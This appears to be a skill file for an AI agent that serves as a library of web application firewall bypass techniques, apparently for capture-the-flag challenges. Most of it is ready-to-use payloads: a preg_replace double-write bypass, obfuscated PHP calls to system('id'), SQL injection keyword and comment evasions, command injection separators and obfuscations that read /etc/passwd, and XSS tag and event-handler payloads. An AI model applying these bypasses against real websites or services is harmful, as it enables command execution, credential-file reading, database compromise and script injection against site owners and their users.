---
name: waf-bypass
description: WAF bypass techniques library — various WAF bypass methods
---

# WAF Bypass Techniques Library

## PHP WAF Bypass

### preg_replace double-write bypass (key technique)

`preg_replace()` **replaces repeatedly** until there are no more matches, but if replacing the keyword **spells out a new keyword**, only the inner one is replaced and the outer one remains.

**Core principle**: `preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → deletes the middle `NSSCTF` → leaves `NSS` + `CTF` = `NSSCTF`

**General template**:
```
Suppose the filtered keyword is X (e.g. NSSCTF)
Construct the input: split X into two halves, embed a complete X in the middle
i.e.: first half of X + X + second half of X

Examples:
Filter NSSCTF → input NSS + NSSCTF + CTF = NSSNSSCTFCTF
Filter flag   → input fl + flag + ag = flflagag
Filter cat    → input ca + cat + t = cacatt
Filter system → input sys + system + tem = syssystemtem
```

**Why simple case-change bypass does not work for preg_replace**:
- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` does not match `NSS` (no i modifier) → output `NssCTF` unchanged
- `NssCTF !== "NSSCTF"` (strict comparison fails) → does not pass
- Only the double-write bypass makes the result after replacement **exactly equal to the original keyword string**

**⚠️ Recognizing the scenario**:
- Source contains `preg_replace('/keyword/', '', $input)` and requires `$input` after replacement to **equal the keyword itself** → use the double-write bypass immediately
- Do not try case-change bypass (result does not equal the original keyword) or encoding bypass (the encoded string does not equal the original keyword)

### Function name obfuscation
- Base64 decode restoration: `$f=base64_decode('c3lzdGVt');$f('id');`
- String concatenation: `$f='sys'.'tem';$f('id');`
- Variable functions: `$a='sys';$b='tem';$a$b('id');`

### Keyword bypass
- Path splitting: `'/va'.'r/ww'.'w/ht'.'ml'`
- Comment bypass: `sys/**/tem('id');`
- String reversal: `$f=strrev('metsys');$f('id');`

## SQL Injection Bypass

### Keyword bypass
- Mixed case: `SeLeCt` instead of `SELECT`
- Inline comments: `S/*!ELECT*/`
- Double encoding: `%2565` → `%65` → `e`
- Equivalent functions: `GROUP_CONCAT` instead of `concat_ws`

### Comment marker variants
- `-- -` instead of `--`
- `--+` instead of `-- `
- `#` instead of `--`

## Command Injection Bypass

### Separator variants
- Newline: `id\nwhoami`
- Pipe: `id|whoami`
- Logical operators: `id&&whoami`
- Subshell: `$(id)` or `` `id` ``

### Command obfuscation
- Variable concatenation: `a=i;b=d;$a$b`
- Wildcards: `/bin/ca? /etc/pas?d`
- Empty variables: `c'a't /etc/passwd`
- Escaping: `c\at /etc/passwd`

## XSS Bypass

### Tag variants
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<body onload=alert(1)>`
- `<input onfocus=alert(1) autofocus>`

### Event handlers
- `onerror`, `onload`, `onclick`, `onfocus`, `onmouseover`

### Encoding bypass
- HTML entity encoding
- Unicode encoding
- Base64 encoding (combined with eval)
